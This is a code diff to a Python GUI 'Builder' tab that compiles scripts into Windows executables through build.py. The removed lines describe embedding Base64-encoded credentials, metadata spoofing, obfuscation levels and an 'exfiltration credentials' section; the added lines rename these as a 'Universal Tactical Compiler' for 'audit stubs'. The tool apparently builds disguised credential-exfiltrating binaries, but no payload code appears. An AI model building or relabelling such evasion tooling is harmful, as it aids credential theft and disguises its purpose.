@@ -1,12 +1,11 @@
 """
 Tab: Builder
 ────────────
-Graphical front-end for build.py — generate a compiled .exe con:
-  • Credential embedding (Base64-encoded)
-  • Icon picker
-  • Metadata spoofing preset selector
-  • Obfuscation level toggle (None / PyInstaller / PyArmor)
-  • Single "Build" button with live output
+Graphical front-end for build.py — Universal Tactical Compiler:
+  • Credential embedding (for audit stubs)
+  • Universal script compilation (including the GUI)
+  • Icon picker & Metadata spoofing
+  • Real-time console output
 """
 
 import threading
@@ -95,7 +94,7 @@ class BuilderView(ctk.CTkScrollableFrame):
 
     def _build_ui(self):
         # ── Credentials card ─────────────────────────────────────────────────
-        make_section_header(self, "Credenciales de Exfiltración", "🔐")
+        make_section_header(self, "Configuración del Binario (Universal)", "⚙️")
         cred_card = make_card(self)
         cred_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))
 
@@ -422,7 +421,8 @@ class BuilderView(ctk.CTkScrollableFrame):
         import subprocess, shutil
         self._has_errors = False
         src_file = self._source_var.get() or "main.py"
-        is_suite_main = Path(src_file).resolve() == Path("main.py").resolve()
+        # Detección inteligente: solo parcheamos si el origen es el main.py de la suite
+        is_suite_main = Path(src_file).name == "main.py"
         patched_src = self._embed_credentials() if is_suite_main else None
         
         cmd = [sys.executable, str(Path("build.py").resolve()), src_file]
@@ -451,7 +451,15 @@ class BuilderView(ctk.CTkScrollableFrame):
                 shutil.copy2(src_file, orig_backup)
                 patched_cwd.replace(src_file)
 
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")
+            proc = subprocess.Popen(
+                cmd, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.STDOUT, 
+                text=True, 
+                encoding="utf-8", 
+                errors="replace",
+                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+            )
             for line in proc.stdout:
                 line = line.rstrip()
                 if not line: continue
